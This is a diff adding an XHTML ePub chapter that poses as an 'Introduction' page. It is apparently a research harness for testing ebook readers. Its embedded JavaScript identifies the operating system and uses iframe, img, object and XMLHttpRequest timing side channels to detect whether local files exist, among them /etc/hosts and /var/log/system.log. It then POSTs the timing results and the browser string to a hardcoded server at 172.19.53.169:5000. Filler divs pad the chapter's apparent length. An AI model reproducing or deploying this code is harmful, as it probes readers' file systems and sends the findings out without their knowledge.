@@ -1,0 +1,585 @@
+<?xml version="1.0" encoding="utf-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta charset="utf-8"/>
+	<title>Introduction</title>
+	<link rel="stylesheet" type="text/css" href="../css/epub-spec.css"/>
+	<link rel="stylesheet" type="text/css" href="../css/introduction.css"/>
+</head>
+<body>
+	<div style="float: right;">
+		<img src="../img/idpflogo_web_125.jpg" alt="IDPF Logo"/>
+	</div>
+	<h1 class="title">Introduction</h1>
+
+	<h1 class="title">Attacks</h1>
+
+	<p id="os_detection">No JS execution</p>
+
+	<h2>Existence of file in /etc folder</h2>
+
+		<h3>Iframes</h3>
+
+		<div id="existence_iframes"></div>
+
+		<iframe src="../img/dummy.png" height="20" id="timing_attack_iframe"></iframe>
+
+		<h3>Img tags</h3>
+
+		<div id="existence_img"></div>
+
+		<img src="../img/dummy.png" height="20" id="timing_attack_img"/>
+
+		<h3>Object tags</h3>
+
+		<div id="existence_object"></div>
+
+		<object data="../img/dummy.png" height="20" id="timing_attack_object">Object fallback</object>
+
+		<h3>XMLHttpRequest API</h3>
+
+		<div id="existence_xhr"></div>
+
+		<h3>Fetch API</h3>
+
+		<div id="existence_fetch"></div>
+
+
+	<!--
+		Some ePub reader applications only account for static content to
+		calculate the chapter length.
+ 	-->
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+	<div style="margin-top: 100em">.</div>
+
+	<script>
+		//<![CDATA[
+		"use strict";
+
+		var os_name
+		var supported_os_list = ["mac", "win", "ios", "android", "linux"];
+
+		var secret_token = "secret-token";
+
+		//var remote_server_addr = "http://localhost:5000";
+		var remote_server_addr = "http://172.19.53.169:5000";
+
+		var xhr_support;
+		var fetch_support;
+
+		window.onload = function() {
+		    // Detect on which operating system the application is running
+		    // The older 'indexOf' is used on purpose, because 'includes' is not supported
+		    // by all ePub readers (ES5 or older).
+		    var appVersion = navigator.appVersion
+		    if (appVersion.indexOf("Macintosh") !== -1) {
+		        os_name = "mac";
+		    } else if (appVersion.indexOf("Windows") !== -1) {
+		        os_name = "win";
+		    } else if (appVersion.indexOf("iPhone") !== -1) {
+		        os_name = "ios";
+		    } else if (appVersion.indexOf("Android") !== -1) {
+		        os_name = "android";
+		    } else if (appVersion.indexOf("Linux") !== -1) {
+		        os_name = "linux";
+		    } else {
+		        os_name = "unknown";
+		    }
+		    console.log("Detected os: " + os_name);
+
+		    // Remove irrelevant os dependent functionality if detected OS is not unknown
+		    if (os_name != "unknown") {
+		        for (var i = 0; i < supported_os_list.length; i++) {
+		            var supported_os = supported_os_list[i];
+		            if (os_name == supported_os) {
+		                continue;
+		            }
+		            var elems = document.getElementsByClassName(supported_os);
+		            for (var j = 0; j < elems.length; j++) {
+		                elems[j].remove();
+		            }
+		        }
+		    }
+			base();
+		};
+
+
+		var direct_url;
+		var sym_file_url;
+		var sym_folder_url;
+
+		var test_files = [];
+
+		/*
+		 * This function is called when the HTML body is loaded, by base.js
+		 *
+		 */
+		function base() {
+
+			var base_url = document.URL.substring(0, document.URL.length - 22);
+
+			// Initialize OS dependent variables
+			var os_detection = document.getElementById("os_detection");
+			if (os_name == "mac") {
+				init_for_macos();
+			} else if (os_name == "win") {
+				init_for_windows();
+			} else if (os_name == "ios") {
+				init_for_ios();
+			} else if (os_name == "android") {
+				init_for_android();
+			} else if (os_name == "linux") {
+				init_for_linux();
+			} else {
+				os_detection.innerHTML = "No OS detected (navigator.appVersion --> " + navigator.appVersion + ")";
+				test_files = [
+					{
+						name: "no OS detected"
+					}
+				]
+			}
+
+			function init_for_macos() {
+				os_detection.innerHTML = "Detected OS: macOS";
+
+				// File content leaking
+				direct_url = "file:///etc/epub_test_file.txt";
+				sym_file_url = base_url + "tests/etc/epub_test_file.txt";
+				sym_folder_url = base_url + "tests/epub_test_file.txt";
+
+				test_files = [
+					{
+						extension: "txt",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_file_path: "../tests/etc/",
+						sym_folder_path: "../tests/",
+						content: "secret-token",
+						permissions: "-rw-r--r-- root"
+					},
+					{
+						extension: "txt",
+						name: "epub_test_file_2G",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						content: "secret-token",
+						permissions: "-rw-r----- root"
+					},
+					{
+						extension: "png",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						permissions: "-rw-r--r-- root"
+					},
+					{
+						extension: "png",
+						name: "epub_test_file_2G",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						permissions: "-rw-r--r-- root"
+					},
+					{
+						extension: "bogus",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						content: "secret-token",
+						permissions: "-rw-r--r-- root"
+					}
+				];
+			}
+
+			function init_for_windows() {
+				os_detection.innerHTML = "Detected OS: Windows";
+
+				// File content leaking
+				direct_url = "file:///C:/evil-epub/test_file.txt";
+				sym_file_url = "N/A";
+				sym_folder_url = "N/A";
+
+				test_files = [
+					{
+						extension: "txt",
+						name: "epub_test_file",
+						direct_path: "file:///C:/evil-epub/",
+						sym_file_path: "../tests/etc/",
+						sym_folder_path: "../tests/",
+						content: "secret-token",
+					},
+					{
+						extension: "png",
+						name: "epub_test_file",
+						direct_path: "file:///C:/evil-epub/",
+					},
+					{
+						extension: "log",
+						name: "epub_test_file",
+						direct_path: "file:///C:/evil-epub/",
+						content: "secret token",
+					},
+					{
+						extension: "bogus",
+						name: "epub_test_file",
+						direct_path: "file:///C:/evil-epub/",
+						content: "secret-token",
+					}
+				];
+			}
+
+			function init_for_ios() {
+				os_detection.innerHTML = "Detected OS: iOS";
+
+				// File content leaking
+				direct_url = "file:///var/log/system.log";
+				sym_file_url = "N/A";
+				sym_folder_url = "N/A";
+
+				test_files = [];
+			}
+
+			function init_for_android() {
+				os_detection.innerHTML = "Detected OS: Android";
+
+				// File content leaking
+				direct_url = "file:///sdcard/evil-epub/epub_test_file.txt";
+				sym_file_url = "../tests/android_test_file.txt";
+				sym_folder_url = "../tests/etc/sdcard/evil-epub/epub_test_file.txt";
+
+				test_files = [
+					{
+						extension: "txt",
+						name: "epub_test_file",
+						direct_path: "file:///storage/self/primary/evil-epub/",
+						sym_folder_path: "../tests/android/",
+						content: "secret-token",
+						permissions: "-rw-rw----"
+					},
+					{
+						extension: "",
+						name: "hosts",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						permissions: "-rw-r--r--"
+					},
+					{
+						extension: "png",
+						name: "epub_test_file",
+						direct_path: "file:///storage/self/primary/evil-epub/",
+						sym_folder_path: "../tests/android/",
+						permissions: "-rw-rw----"
+					},
+					{
+						extension: "bogus",
+						name: "epub_test_file",
+						direct_path: "file:///storage/self/primary/evil-epub/",
+						sym_folder_path: "../tests/android/",
+						content: "secret-token",
+						permissions: "-rw-rw----"
+					}
+				];
+			}
+
+			function init_for_linux() {
+				os_detection.innerHTML = "Detected OS: Linux";
+
+				// File content leaking
+				direct_url = "file:///etc/epub_test_file.txt";
+				sym_file_url = base_url + "tests/etc/epub_test_file.txt";
+				sym_folder_url = base_url + "tests/epub_test_file.txt";
+
+				test_files = [
+					{
+						extension: "txt",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_file_path: "../tests/etc/",
+						sym_folder_path: "../tests/",
+						content: "secret-token",
+						permissions: "-rw-r--r-- root"
+					},
+					{
+						extension: "png",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						permissions: "-rw-r--r-- root"
+					},
+					{
+						extension: "bogus",
+						name: "epub_test_file",
+						direct_path: "file:///etc/",
+						sym_folder_path: "../tests/etc/",
+						content: "secret-token",
+						permissions: "-rw-r--r-- root"
+					}
+				];
+
+			}
+			fill_tables_existence_iframe();
+		}
+
+		function fill(class_id, text) {
+			var elems = document.getElementsByClassName(class_id);
+			for (var i = 0; i < elems.length; i++) {
+				elems[i].innerHTML = text;
+			}
+		}
+
+		var NON_EXISTING_FILE_NAME = "does_not_exist";
+		var TIMEOUT_IN_MS = 50;
+
+		function time_to_render_iframe(url, resolve) {
+			var end = 'undefined';
+			var iframe = document.getElementById("timing_attack_iframe");
+			iframe.onload = function() {
+				end = performance.now();
+			};
+
+			var start = performance.now();
+			try {
+				iframe.src = url + "?dummy=" + Math.floor(Math.random() * 1000000);
+			} catch(err) {
+				console.log(err.message);
+			}
+
+			setTimeout(function() {
+				if (end == 'undefined') {
+					resolve(-1);
+				} else {
+					resolve(end - start);
+				}
+			}, TIMEOUT_IN_MS);
+		}
+
+		function time_to_render_img(url, resolve, err) {
+			var end = 'undefined';
+			var img = document.getElementById("timing_attack_img");
+			img.onerror = function() {
+				end = performance.now();
+			};
+
+			var start = performance.now();
+			try {
+				img.src = url + "?dummy=" + Math.floor(Math.random() * 1000000);
+			} catch(err) {
+				console.log(err.message);
+			}
+
+			setTimeout(function() {
+				if (end == 'undefined') {
+					resolve(-1);
+				} else {
+					resolve(end - start);
+				}
+			}, TIMEOUT_IN_MS);
+		}
+
+		function time_to_render_object(url, resolve, err) {
+			var end = 'undefined';
+			var object = document.getElementById("timing_attack_object");
+			object.onload = function() {
+				end = performance.now();
+			};
+
+			var start = performance.now();
+			try {
+				object.data = url + "?dummy=" + Math.floor(Math.random() * 1000000);
+			} catch(err) {
+				console.log(err.message);
+			}
+
+			setTimeout(function() {
+				if (end == 'undefined') {
+					resolve(-1);
+				} else {
+					resolve(end - start);
+				}
+			}, TIMEOUT_IN_MS);
+		}
+
+		function time_to_render_xhr(url, resolve, err) {
+			var end = 'undefined';
+			var xhr = new XMLHttpRequest();
+			xhr.open("GET", url + "?dummy=" + Math.floor(Math.random() * 1000000));
+			xhr.onreadystatechange = function() {
+				end = performance.now();
+			};
+
+			var start = performance.now();
+			try {
+				xhr.send();
+			} catch(err) {
+				console.log(err.message);
+			}
+
+			setTimeout(function() {
+				if (end == 'undefined') {
+					resolve(-1);
+				} else {
+					resolve(end - start);
+				}
+			}, TIMEOUT_IN_MS);
+		}
+
+		function get_times(func, url1, url2, n, resolve) {
+			var i = 0;
+			var mean = 0;
+			var times = {};
+			times[url1] = [];
+			times[url2] = [];
+
+			var next1 = function(time) {
+				times[url2].push(time);
+				if (i < (n * 2 - 1)) {
+					i++;
+					func(url1, next2);
+				} else {
+					resolve(times);
+				}
+			}
+
+			var next2 = function(time) {
+				times[url1].push(time);
+				if (i < (n * 2 - 1)) {
+					i++;
+					func(url2, next1);
+				} else {
+					resolve(times);
+				}
+			}
+
+			func(url2, next1);
+		}
+
+		function measure(func, url_exists, url_exists_not, n, id_exists, id_exists_not) {
+			get_times(func, url_exists, url_exists_not, n,
+				function(times) {
+					var mean1 = get_mean(times[url_exists]);
+					var sd1 = get_sd(mean1, times[url_exists]);
+					var mean2 = get_mean(times[url_exists_not]);
+					var sd2 = get_sd(mean2, times[url_exists_not]);
+					console.log(times[url_exists]);
+					console.log(times[url_exists_not]);
+					document.getElementById(id_exists).innerHTML = "<th>" + url_exists + "</th><th>" + mean1 + "</th><th>" + sd1 + "</th>";
+					document.getElementById(id_exists_not).innerHTML = "<th>" + url_exists_not + "</th><th>" + mean2 + "</th><th>" + sd2 + "</th>";
+
+					var iframe = document.createElement("iframe");
+					document.getElementById(id_exists).parentElement.parentElement.appendChild(iframe);
+					iframe.contentWindow.document.open();
+					iframe.contentWindow.document.write(JSON.stringify(times));
+					iframe.contentWindow.document.close();
+
+					var xhr = new XMLHttpRequest();
+					xhr.open("POST", remote_server_addr + "/timing");
+					//xhr.open("POST", remote_server_addr + "/timing");
+					xhr.setRequestHeader("Content-Type", "text/plain");
+					xhr.send(JSON.stringify({"name": navigator.appVersion, "data": times}));
+			});
+		}
+
+		function get_mean(list) {
+			var mean = 0;
+			var n = list.length;
+			for (var i = 0; i < n; i++) {
+				mean += list[i] / n;
+			}
+			return mean;
+		}
+
+		function get_sd(mean, list) {
+			var sd = 0;
+			var n = list.length;
+			for (var i = 0; i < n; i++) {
+				if (list[i] < 0) {
+					return 0;
+				}
+				sd += Math.pow(list[i] - mean, 2) / n;
+			}
+			return Math.sqrt(sd);
+		}
+
+		function fill_tables_existence_iframe() {
+			var vessels = [
+				[document.getElementById("existence_iframes"), time_to_render_iframe],
+				[document.getElementById("existence_img"), time_to_render_img],
+				[document.getElementById("existence_object"), time_to_render_object],
+				[document.getElementById("existence_xhr"), time_to_render_xhr]
+				//[document.getElementById("existence_fetch"), time_to_render_fetch],
+			];
+			for (var i = 0; i < test_files.length; i++) {
+				var entry = test_files[i];
+				append_section_title(vessels[0][0], "<h4>iFrame -- ." + entry["extension"] + "</h4>");
+				append_section_title(vessels[1][0], "<h4>img -- ." + entry["extension"] + "</h4>");
+				append_section_title(vessels[2][0], "<h4>object -- ." + entry["extension"] + "</h4>");
+				append_section_title(vessels[3][0], "<h4>XMLHttpRequest -- ." + entry["extension"] + "</h4>");
+				//append_section_title(vessels[4][0], "<h4>Fetch -- ." + entry["extension"] + "</h4>");
+
+				for (var j = 0; j < vessels.length; j++) {
+					if ("direct_path" in entry) {
+						create_experiment(vessels[j][0], vessels[j][1],
+							entry["direct_path"] + entry["name"] + "." + entry["extension"],
+							entry["direct_path"] + NON_EXISTING_FILE_NAME + "." + entry["extension"]);
+					}
+					if ("sym_file_path" in entry) {
+						create_experiment(vessels[j][0], vessels[j][1],
+							entry["sym_file_path"] + entry["name"] + "." + entry["extension"],
+							entry["sym_file_path"] + NON_EXISTING_FILE_NAME + "." + entry["extension"]);
+					}
+					if ("sym_folder_path" in entry) {
+						create_experiment(vessels[j][0], vessels[j][1],
+							entry["sym_folder_path"] + entry["name"] + "." + entry["extension"],
+							entry["sym_folder_path"] + NON_EXISTING_FILE_NAME + "." + entry["extension"]);
+					}
+				}
+			}
+		}
+
+		function append_section_title(elem, innerText) {
+			var title_elem = document.createElement("h4");
+			title_elem.innerHTML = innerText;
+			elem.appendChild(title_elem);
+		}
+
+		function create_experiment(top_div, func, non_existing_file, existing_file) {
+			var exp_div = document.createElement("div");
+			top_div.appendChild(exp_div);
+			var table = document.createElement("table");
+			exp_div.appendChild(table);
+
+			var existing_file_entry_id = get_unique_id(existing_file);
+			var non_existing_file_entry_id = get_unique_id(non_existing_file);
+
+			table.innerHTML = "<tr><th>Resource path</th><th>Mean time</th><th>Standard deviation</th></tr>";
+			table.innerHTML += "<tr id='" + existing_file_entry_id + "'><th>" + existing_file + "</th></tr>";
+			table.innerHTML += "<tr id='" + non_existing_file_entry_id + "'><th>" + non_existing_file + "</th></tr>";
+
+			var start_button = document.createElement("button");
+			start_button.innerHTML = "Start experiment " + existing_file;
+			exp_div.appendChild(start_button);
+			start_button.onclick = function() {
+				measure(func, existing_file, non_existing_file, 1000, existing_file_entry_id , non_existing_file_entry_id);
+			};
+		}
+
+		var id_counter = 0;
+		function get_unique_id(name) {
+			return name + (id_counter++);
+		}
+		//]]>
+	</script>
+</body>
+</html>
